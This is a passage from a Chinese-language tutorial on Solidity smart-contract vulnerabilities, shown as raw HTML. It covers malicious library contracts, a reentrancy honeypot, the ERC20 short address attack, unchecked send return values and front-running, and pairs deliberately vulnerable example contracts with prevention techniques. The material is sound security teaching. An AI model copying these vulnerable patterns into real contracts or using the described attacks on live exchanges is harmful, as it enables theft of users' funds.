class="token punctuation">)</span><span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">emit</span> <span class="token function">Result</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约实现了 ROT26 密码，它将每个字符移动 26 个位置（即，什么都不做）。同样，无需了解本合同中的组件。更简单地说，攻击者可以将以下合约链接到相同的效果：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Print</span><span class="token punctuation">&#123;</span>    <span class="token keyword">event</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">rot13Encrypt</span><span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">emit</span> <span class="token function">Print</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如果在构造函数中给出了这些合约中的任何一个的地址，则 <code>encryptPrivateData</code> 函数将简单地生成一个打印未加密私有数据的事件。</p><p>尽管在此示例中，在构造函数中设置了类似库的合约，但通常情况下，特权用户（例如所有者）可以更改库合约地址。如果链接的合约不包含被调用的函数，则将执行回退函数。例如，使用行 <code>encryptionLibrary.rot13Encrypt()</code>，如果由 <code>encryptionLibrary</code> 指定的合约是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Blank</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">event</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token builtin">string</span> text<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">emit</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"Here"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// put malicious code here and it will run</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后将发出带有文本 <code>Here</code> 的事件。因此，如果用户可以更改合约库，他们原则上可以让其他用户在不知不觉中运行任意代码。</p><table><thead><tr><th>警告</th><th>此处表示的合约仅用于演示目的，并不代表适当的加密。它们不应该用于加密。</th></tr></thead></table><h3 id="预防技术-6"><a href="#预防技术-6" class="headerlink" title="预防技术"></a>预防技术</h3><p>如前所述，可以（在某些情况下）以恶意行为的方式部署安全合约。审计员可以公开验证合约并让其所有者以恶意方式部署它，从而导致公开审计的合约具有漏洞或恶意意图。</p><p>有许多技术可以防止这些情况。</p><p><strong>一种技术是使用 new 关键字来创建合同。</strong>在前面的例子中，构造函数可以写成：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    encryptionLibrary <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Rot13Encryption</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>这样，在部署时会创建引用合约的实例，部署者无法在不更改的情况下替换 <code>Rot13Encryption</code> 合约。</p><p><strong>另一种解决方案是硬编码外部合约地址。</strong></p><p>一般来说，调用外部合约的代码应该总是被仔细审计。作为开发人员，在定义外部合约时，最好将合约地址公开（在下一节的 honey-pot 示例中不是这种情况），以便用户轻松检查合约引用的代码。相反，如果合约有一个私有变量合约地址，它可能是某人恶意行为的迹象（如现实世界示例所示）。如果用户可以更改用于调用外部函数的合约地址，那么（在分散的系统环境中）实施时间锁定和&#x2F;或投票机制以允许用户查看正在更改的代码可能很重要，或者让参与者有机会选择加入&#x2F;退出新的合约地址。</p><h3 id="现实世界的例子：Reentrancy-Honey-Pot"><a href="#现实世界的例子：Reentrancy-Honey-Pot" class="headerlink" title="现实世界的例子：Reentrancy Honey Pot"></a>现实世界的例子：Reentrancy Honey Pot</h3><p>最近在主网上发布了一些 honey pot。这些合约试图比试图利用这些合约的以太坊黑客更聪明，但他们最终会因他们期望利用的合约而失去以太币。一个示例通过在构造函数中用恶意合约替换预期合约来使用这种攻击。代码可以在<a href="https://etherscan.io/address/0x95d34980095380851902ccd9a1fb4c813c2cb639">这里</a>找到：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.19</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Private_Bank</span><span class="token punctuation">&#123;</span>    <span class="token keyword">mapping</span> <span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> MinDeposit <span class="token operator">=</span> <span class="token number">1</span> ether<span class="token punctuation">;</span>    Log TransferLog<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">Private_Bank</span><span class="token punctuation">(</span><span class="token builtin">address</span> _log<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        TransferLog <span class="token operator">=</span> <span class="token function">Log</span><span class="token punctuation">(</span>_log<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">Deposit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">public</span>    <span class="token keyword">payable</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">>=</span> MinDeposit<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">+=</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">;</span>            TransferLog<span class="token punctuation">.</span><span class="token function">AddMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span>msg<span class="token punctuation">.</span>value<span class="token punctuation">,</span><span class="token string">"Deposit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">CashOut</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _am<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>_am<span class="token operator">&lt;=</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span>call<span class="token punctuation">.</span><span class="token function">value</span><span class="token punctuation">(</span>_am<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span><span class="token operator">-=</span>_am<span class="token punctuation">;</span>                TransferLog<span class="token punctuation">.</span><span class="token function">AddMessage</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">,</span>_am<span class="token punctuation">,</span><span class="token string">"CashOut"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">contract</span> <span class="token class-name">Log</span><span class="token punctuation">&#123;</span>    <span class="token keyword">struct</span> <span class="token class-name">Message</span>    <span class="token punctuation">&#123;</span>        <span class="token builtin">address</span> Sender<span class="token punctuation">;</span>        <span class="token builtin">string</span>  Data<span class="token punctuation">;</span>        <span class="token builtin">uint</span> Val<span class="token punctuation">;</span>        <span class="token builtin">uint</span>  Time<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    Message<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token keyword">public</span> History<span class="token punctuation">;</span>    Message LastMsg<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">AddMessage</span><span class="token punctuation">(</span><span class="token builtin">address</span> _adr<span class="token punctuation">,</span><span class="token builtin">uint</span> _val<span class="token punctuation">,</span><span class="token builtin">string</span> _data<span class="token punctuation">)</span>    <span class="token keyword">public</span>    <span class="token punctuation">&#123;</span>        LastMsg<span class="token punctuation">.</span>Sender <span class="token operator">=</span> _adr<span class="token punctuation">;</span>        LastMsg<span class="token punctuation">.</span>Time <span class="token operator">=</span> now<span class="token punctuation">;</span>        LastMsg<span class="token punctuation">.</span>Val <span class="token operator">=</span> _val<span class="token punctuation">;</span>        LastMsg<span class="token punctuation">.</span>Data <span class="token operator">=</span> _data<span class="token punctuation">;</span>        History<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>LastMsg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>一位 reddit 用户的<a href="https://www.reddit.com/r/ethdev/comments/7x5rwr/tricked_by_a_honeypot_contract_or_beaten_by/">这篇文章</a>解释了他们是如何通过试图利用他们预计会出现在合约中的可重入性错误来为该合约损失 1 个以太币的。</p><h2 id="短地址-x2F-参数攻击-Short-Address-x2F-Parameter-Attack"><a href="#短地址-x2F-参数攻击-Short-Address-x2F-Parameter-Attack" class="headerlink" title="短地址&#x2F;参数攻击 (Short Address&#x2F;Parameter Attack)"></a>短地址&#x2F;参数攻击 (Short Address&#x2F;Parameter Attack)</h2><p>这种攻击不是针对 Solidity 合约本身，而是针对可能与其交互的第三方应用程序。添加此部分是为了完整性，并让读者了解如何在合约中操纵参数。</p><p>如需进一步阅读，请参阅“<a href="https://medium.com/huzzle/ico-smart-contract-vulnerability-short-address-attack-31ac9177eb6b">ICO 智能合约漏洞：短地址攻击</a>”或此 <a href="https://www.reddit.com/r/ethereum/comments/6r9nhj/cant_understand_the_erc20_short_address_attack/">Reddit 帖子</a>。</p><h3 id="漏洞-7"><a href="#漏洞-7" class="headerlink" title="漏洞"></a>漏洞</h3><p>将参数传递给智能合约时，参数根据 <a href="https://docs.soliditylang.org/en/latest/abi-spec.html">ABI 规范</a> 进行编码。可以发送比预期参数长度短的编码参数（例如，发送一个只有 38 个十六进制字符（19 个字节）而不是标准的 40 个十六进制字符（20 个字节）的地址）。在这种情况下，EVM 将在编码参数的末尾添加零以构成预期长度。</p><p>当第三方应用程序不验证输入时，这会成为一个问题。最明显的例子是当用户请求提款时不验证 ERC20 代币地址的交易所。这个例子在 Peter Vessenes 的文章“The ERC20 Short Address Attack Explained”中有更详细的介绍。</p><p>考虑标准 ERC20 transfer 函数接口，注意参数的顺序：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint</span> tokens<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>现在考虑一个持有大量代币（比方说 <code>REP</code>）的交易所和一个希望提取其 100 个代币份额的用户。用户将提交他们的地址 <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeaddead</code> 和代币数量 100。交易所将按照 <code>transfer</code> 函数指定的顺序对这些参数进行编码；也就是说，先 <code>address</code> 然后 <code>token</code>。编码结果将是：</p><figure><div class="code-wrapper"><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">a9059cbb000000000000000000000000deaddeaddea \ddeaddeaddeaddeaddeaddeaddead0000000000000000000000000000000000000000000000056bc75e2d63100000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>前 4 个字节（<code>a9059cbb</code>）是 <code>transfer</code> <a href="https://docs.soliditylang.org/en/latest/abi-spec.html#function-selector">函数签名&#x2F;选择器</a>，接下来的 32 个字节是地址，最后 32 个字节代表 <code>uint256</code> token数。请注意，末尾的十六进制 <code>56bc75e2d63100000</code> 对应于 100 个代币（小数点后 18 位，由 <code>REP</code> 代币合约指定）。</p><p>现在让我们看看如果发送一个缺少 1 个字节（2 个十六进制数字）的地址会发生什么。具体来说，假设攻击者发送 <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddeadde</code> 作为地址（缺少最后两位数字）和相同的 100 个令牌以提取。如果交易所不验证此输入，它将被编码为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">a9059cbb000000000000000000000000deaddeaddea \ddeaddeaddeaddeaddeaddeadde0000000000000000000000000000000000000000000000056bc75e2d6310000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>差异是微妙的。请注意，<code>00</code> 已添加到编码的末尾，以弥补发送的短地址。当它被发送到智能合约时，地址参数将被读取为 <code>0xdeaddeaddeaddeaddeaddeaddeaddeaddeadde00</code> 并且值将被读取为 <code>56bc75e2d6310000000</code>（注意两个额外的 0）。该值现在是 <code>25600</code> 个令牌（该值已乘以 <code>256</code>）。在这个例子中，如果交易所持有这么多代币，用户将提取 <code>25600</code> 个代币（而交易所认为用户只提取了 <code>100</code> 个）到修改后的地址。显然，在这个例子中，攻击者不会拥有修改后的地址，但是如果攻击者要生成任何以 0 结尾的地址（这很容易被暴力破解）并使用这个生成的地址，他们就可以从毫无戒心的交易所窃取代币.</p><h3 id="预防技术-7"><a href="#预防技术-7" class="headerlink" title="预防技术"></a>预防技术</h3><p><strong>外部应用程序中的所有输入参数都应在发送到区块链之前进行验证。</strong>还应注意，<strong>参数排序在这里起着重要作用。</strong>由于填充只发生在最后，智能合约中参数的仔细排序可以减轻这种攻击的某些形式。</p><h2 id="未检查的-CALL-返回值-Unchecked-CALL-Return-Values"><a href="#未检查的-CALL-返回值-Unchecked-CALL-Return-Values" class="headerlink" title="未检查的 CALL 返回值 (Unchecked CALL Return Values)"></a>未检查的 CALL 返回值 (Unchecked CALL Return Values)</h2><p>在 Solidity 中有多种执行外部调用的方法。向外部账户发送以太币通常是通过转账方式进行的。但是，也可以使用 <code>send</code> 函数，对于更通用的外部调用，可以在 Solidity 中直接使用 <code>CALL</code> 操作码。 <code>call</code> 和 <code>send</code> 函数返回一个布尔值，指示调用是成功还是失败。因此，这些函数有一个简单的警告(caveat)，如果外部调用（由 <code>call</code> 或 <code>send</code> 初始化）失败，执行这些函数的交易将不会 revert；相反，这些函数只会返回 <code>false</code>。一个常见的错误是开发人员希望(expect)在外部调用失败时发生revert，并且没有检查返回值。</p><p>如需进一步阅读，请参阅 <a href="https://www.dasp.co/#item-4">DASP - TOP 10</a> 和 <a href="https://hackingdistributed.com/2016/06/16/scanning-live-ethereum-contracts-for-bugs/">“Scanning Live Ethereum Contracts for the ‘Unchecked-Send’ Bug”</a>。</p><h3 id="漏洞-8"><a href="#漏洞-8" class="headerlink" title="漏洞"></a>漏洞</h3><p>考虑以下示例：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Lotto</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">bool</span> <span class="token keyword">public</span> payedOut <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> winner<span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">public</span> winAmount<span class="token punctuation">;</span>    <span class="token comment">// ... extra functionality here</span>    <span class="token keyword">function</span> <span class="token function">sendToWinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token operator">!</span>payedOut<span class="token punctuation">)</span><span class="token punctuation">;</span>        winner<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>winAmount<span class="token punctuation">)</span><span class="token punctuation">;</span>        payedOut <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">withdrawLeftOver</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>payedOut<span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这代表了一个类似于 Lotto 的合约，<code>winner</code> 将获得 <code>winAmount</code> 的以太币，这通常会留下一些剩余的以太币供任何人提取。</p><p>该漏洞存在于第 11 行，其中使用了 <code>send</code> 而没有检查响应。在这个简单的例子中，无论是否发送了以太币，交易失败的 <code>winner</code>（无论是因为耗尽了 gas 还是因为合约故意抛出了 fallback 函数）都允许将 <code>payedOut</code> 设置为 <code>true</code>。在这种情况下，任何人都可以通过 <code>withdrawLeftOver</code>  函数提取获胜者的奖金。</p><h3 id="预防技术-8"><a href="#预防技术-8" class="headerlink" title="预防技术"></a>预防技术</h3><p>尽可能使用 <code>transfer</code> 函数而不是 <code>send</code>，因为如果外部交易 revert，<code>transfer</code> 将会 revert。如果需要使用 <code>send</code>，请始终检查返回值。</p><p>更有力的<a href="https://docs.soliditylang.org/en/latest/common-patterns.html#withdrawal-from-contracts">建议</a>是采用 <em>withdrawal pattern</em>。在这个解决方案中，每个用户都必须调用一个独立的 withdraw 函数来处理从合约中发送以太币并处理发送交易失败的后果。这个想法是在逻辑上将外部发送功能与代码库的其余部分隔离开来，并将可能失败的交易的负担放在调用 withdraw 函数的最终的用户身上。</p><h3 id="现实世界的例子：Etherpot-and-King-of-Ether"><a href="#现实世界的例子：Etherpot-and-King-of-Ether" class="headerlink" title="现实世界的例子：Etherpot and King of Ether"></a>现实世界的例子：Etherpot and King of Ether</h3><p><a href="https://github.com/etherpot/contract/blob/master/app/contracts/lotto.sol">Etherpot</a> 是一种智能合约彩票，与前面提到的示例合约没有太大区别。该合约的失败主要是由于不正确使用区块哈希（只有最后 256 个区块哈希可用；请参阅 Aakil Fernandes 的帖子，了解 Etherpot 如何未能正确考虑这一点）。但是，该合约也遭受了未经检查的看涨期权价值。考虑 lotto.sol: Code snippet 中的函数 <code>cash</code>：代码片段。</p><p>示例9. lotto.sol: Code snippet</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token keyword">function</span> <span class="token function">cash</span><span class="token punctuation">(</span><span class="token builtin">uint</span> roundIndex<span class="token punctuation">,</span> <span class="token builtin">uint</span> subpotIndex<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> subpotsCount <span class="token operator">=</span> <span class="token function">getSubpotsCount</span><span class="token punctuation">(</span>roundIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>subpotIndex<span class="token operator">>=</span>subpotsCount<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> decisionBlockNumber <span class="token operator">=</span> <span class="token function">getDecisionBlockNumber</span><span class="token punctuation">(</span>roundIndex<span class="token punctuation">,</span>subpotIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>decisionBlockNumber<span class="token operator">></span>block<span class="token punctuation">.</span>number<span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rounds<span class="token punctuation">[</span>roundIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>isCashed<span class="token punctuation">[</span>subpotIndex<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token comment">//Subpots can only be cashed once. This is to prevent double payouts</span>        <span class="token keyword">var</span> winner <span class="token operator">=</span> <span class="token function">calculateWinner</span><span class="token punctuation">(</span>roundIndex<span class="token punctuation">,</span>subpotIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> subpot <span class="token operator">=</span> <span class="token function">getSubpot</span><span class="token punctuation">(</span>roundIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        winner<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>subpot<span class="token punctuation">)</span><span class="token punctuation">;</span>        rounds<span class="token punctuation">[</span>roundIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>isCashed<span class="token punctuation">[</span>subpotIndex<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">//Mark the round as cashed</span><span class="token punctuation">&#125;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，在第 21 行，<code>send</code> 函数的返回值没有被检查，接下来的行设置了一个布尔值，表示获胜者已经收到了他们的资金。这个错误可能允许获胜者没有收到他们的以太币的状态，但合约的状态可以表明获胜者已经被支付。</p><p>此错误的更严重版本发生在 <a href="https://www.kingoftheether.com/thrones/kingoftheether/index.html">King of the Ether</a> 中。该合约的 <a href="https://www.kingoftheether.com/postmortem.html">Post-Mortem Investigation</a> 详细说明了如何使用未经检查的失败发送来攻击合约。</p><h2 id="竞争条件-x2F-抢跑-Race-Conditions-x2F-Front-Running"><a href="#竞争条件-x2F-抢跑-Race-Conditions-x2F-Front-Running" class="headerlink" title="竞争条件&#x2F;抢跑 (Race Conditions&#x2F;Front Running)"></a>竞争条件&#x2F;抢跑 (Race Conditions&#x2F;Front Running)</h2><p>对其他合约的外部调用和底层区块链的多用户性质相结合，导致了各种潜在的 Solidity 陷阱，用户竞相(<em>race</em>)执行代码来获得意外状态(<em>unexpected states</em>)。重入（本章前面讨论过）就是这种竞争条件的一个例子。在本节中，我们将讨论以太坊区块链上可能发生的其他类型的竞争条件。关于这个主题有很多很好的帖子，包括 <a href="https://github.com/ethereum/wiki/wiki/Safety#race-conditions">以太坊 Wiki</a> 上的“Race Conditions”、<a href="https://www.dasp.co/#item-7">DASP - TOP 10</a> 以及 <a href="https://consensys.github.io/smart-contract-best-practices/">Ethereum Smart Contract Best Practices</a>。</p><h3 id="漏洞-9"><a href="#漏洞-9" class="headerlink" title="漏洞"></a>漏洞</h3><p>与大多数区块链一样，以太坊节点汇集交易并将它们形成区块。只有当矿工解决了共识机制（目前是以太坊的 Ethash PoW）后，这些交易才被认为是有效的。解决区块的矿工还选择池中的哪些交易将包含在区块中，通常按每笔交易的 <code>gasPrice</code> 排序。这是一个潜在的攻击向量。攻击者可以查看交易池中可能包含问题解决方案的交易，并修改或撤销求解器的权限或更改对求解器不利的合约状态。然后，攻击者可以从该交易中获取数据并创建自己的具有更高 <code>gasPrice</code> 的交易，以便他们的交易包含在原始交易之前的块中。</p><p>让我们用一个简单的例子来看看它是如何工作的。考虑 FindThisHash.sol 中显示的合约。</p><p>示例10. FindThisHash.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">FindThisHash</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">bytes32</span> <span class="token keyword">constant</span> <span class="token keyword">public</span> hash <span class="token operator">=</span>      <span class="token number">0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a</span><span class="token punctuation">;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// load with ether</span>    <span class="token keyword">function</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token builtin">string</span> solution<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// If you can find the pre-image of the hash, receive 1000 ether</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>hash <span class="token operator">==</span> <span class="token function">sha3</span><span class="token punctuation">(</span>solution<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token number">1000</span> ether<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>假设该合约包含 1,000 个以太币。可以找到以下 SHA-3 哈希的原像的用户可以提交解决方案并取回 1,000 以太币：</p><figure><div class="code-wrapper"><pre class="line-numbers language-markdown" data-language="markdown"><code class="language-markdown">0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>假设一位用户发现解决方案是 <code>Ethereum!</code> 他们用 <code>Ethereum!</code>  作为参数来调用 <code>solve</code>。不幸的是，攻击者已经足够聪明，可以监视任何提交解决方案的交易池。他们看到这个解决方案，检查它的有效性，然后提交一个比原始交易高得多的 <code>gasPrice</code> 的等价交易。由于 <code>gasPrice</code> 较高，解决区块的矿工可能会优先考虑攻击者，并在原始解决者之前挖掘他们的交易。攻击者将拿走 1,000 个以太币，而解决问题的用户将一无所获。请记住，在这种类型的“抢先运行(<em>front-running</em>)”漏洞中，矿工被独特地激励来自己运行攻击（或者可以被贿赂以高昂的费用运行这些攻击）。不应低估攻击者本身就是矿工的可能性。</p><h3 id="预防技术-9"><a href="#预防技术-9" class="headerlink" title="预防技术"></a>预防技术</h3><p>有两类参与者可以执行这些类型的抢先攻击：用户（修改其交易的 <code>gasPrice</code>）和矿工自己（他们可以按照他们认为合适的方式对区块中的交易进行重新排序）。易受第一类（用户）攻击的合约比易受第二类（矿工）攻击的合约要糟糕得多，因为矿工只能在解决区块时执行攻击，这对于任何针对特定区块的单个矿工来说都不太可能。在这里，我们将列出与这两类攻击者相关的一些缓解措施。</p><p>一种方法是在 <code>gasPrice</code> 上设置一个上限。这可以防止用户增加 <code>gasPrice</code> 并获得超出上限的优惠交易排序。该措施只防范第一类攻击者（任意用户）。在这种情况下，矿工仍然可以攻击合约，因为他们可以随意对区块中的交易进行排序，而不管 gas 价格如何。</p><p>一种更稳健的方法是使用 <a href="https://ethereum.stackexchange.com/questions/191/how-can-i-securely-generate-a-random-number-in-my-smart-contract">commit-reveal</a> 